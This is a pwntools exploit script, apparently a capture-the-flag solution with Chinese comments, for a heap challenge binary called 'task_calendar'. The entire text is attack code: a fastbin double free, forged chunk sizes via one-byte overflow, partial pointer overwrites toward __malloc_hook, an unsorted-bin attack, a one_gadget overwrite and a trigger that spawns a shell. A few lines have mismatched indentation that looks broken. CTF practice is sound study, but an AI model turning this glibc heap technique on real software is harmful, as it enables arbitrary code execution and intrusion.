from pwn import *

context.log_level = 'debug'

#p = process("./task_calendar",env = {"LD_PRELOAD":"./libc.so.6"})
p = process("./task_calendar")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
print "sys_address:",hex(libc.symbols['system'])
def Free(days):
	p.recvuntil("choice> ")
	p.sendline("3")
	p.recvuntil("choice> ")
	p.sendline(str(days))

def Edit(days,size,info):
	p.recvuntil("choice> ")
	p.sendline("2")
	p.recvuntil("choice> ")
	p.sendline(str(days))
	p.recvuntil("size> ")
	p.sendline(str(size))
	p.recvuntil("info> ")
	p.send(info)

def Add(days,size):  
	p.recvuntil("choice> ")
	p.sendline("1")
	p.recvuntil("choice> ")
	p.sendline(str(days))
	p.recvuntil("size> ")
	p.sendline(str(size))

if __name__=='__main__':
	p.recvuntil("input calendar name> ")
	name = "A"*20
	p.sendline(name)
	
	Add(1,0x18)
	Add(2,0x68)
	Add(3,0x68)
	Add(4,0x68)
	
# fast-bin attack
	Free(2)
	Free(3)
	Free(2)

	Add(2,0x68)
	Add(3,0x68)

# build fake unsorted bin, chunk2->main_arena+0x88

	over_one = 'a'*0x18
	over_one += '\xe1' #伪造size，释放处unsorted bin
	Edit(1,len(over_one)-1,over_one)
	Free(2)
	Add(2,0x48) #从unsorted bin上拆链，如果申请堆的大小为0x68，由于fastbin上有符合大小的bin，会报错

	over_one = 'a'*0x18
	over_one += '\x71' 
	Edit(1,len(over_one)-1,over_one)
		
	arena_po = '\xed\x1a'
	Edit(2,len(arena_po)-1,arena_po)

	Add(4,0x68)
	Add(4,0x68)
# fix fastbin 
	Free(3)
	fix_fd = p64(0)
	Edit(3,len(fix_fd)-1,fix_fd) #修复fastbin
	Add(3,0x68)
	Add(3,0x30)  #fix unsorted bin
	Add(3,0x40) 

# unsorted bin attack
	
	over_one = 'a'*0x18
	over_one += '\xe1'
	Edit(1,len(over_one)-1,over_one)
	
	Free(2) #获得unsorted bin
	
	#gdb.attach(p)
	malloc_hook_po = 'a'*0x8+'\x00\x1b' #__malloc_hook-0x23
	Edit(2,len(malloc_hook_po)-1,malloc_hook_po)

	over_one = 'a'*0x18 #覆盖P->bk
    over_one += '\x71'
    Edit(1,len(over_one)-1,over_one)
		
	Add(2,0x68)	#脱链，进行unsorted bin attack
	
	onegadget = "\xa4\xd2\xaf"
	onegadget_over = "a"*0x13 + onegadget	
	Edit(4,len(onegadget_over)-1,onegadget_over)
	
	Free(1)
	Free(1)
	
	p.interactive()
